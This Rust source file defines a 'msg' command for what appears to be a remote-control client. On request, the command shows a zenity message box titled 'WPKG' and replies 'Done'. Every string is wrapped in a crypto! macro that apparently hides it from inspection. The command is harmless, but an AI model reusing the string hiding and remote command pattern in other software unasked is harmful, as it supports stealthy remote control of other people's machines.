use super::prelude::*;

pub struct Msg;

#[async_trait]
impl Command for Msg {
    fn name(&self) -> String {
        crypto!("msg")
    }

    fn help(&self) -> String {
        crypto!("<message> - display message")
    }

    fn min_args(&self) -> usize {
        1
    }

    #[allow(unused_variables)]
    async fn execute(&self, client: &mut Client, args: Vec<&str>) -> anyhow::Result<()> {
        #[cfg(not(target_os = "windows"))]
        run_process(
            "zenity",
            vec!["--info", "--text", &args.join(" "), "--title", "WPKG"],
            false,
        )?;

        client.send(ok(crypto!("Done")))
    }
}
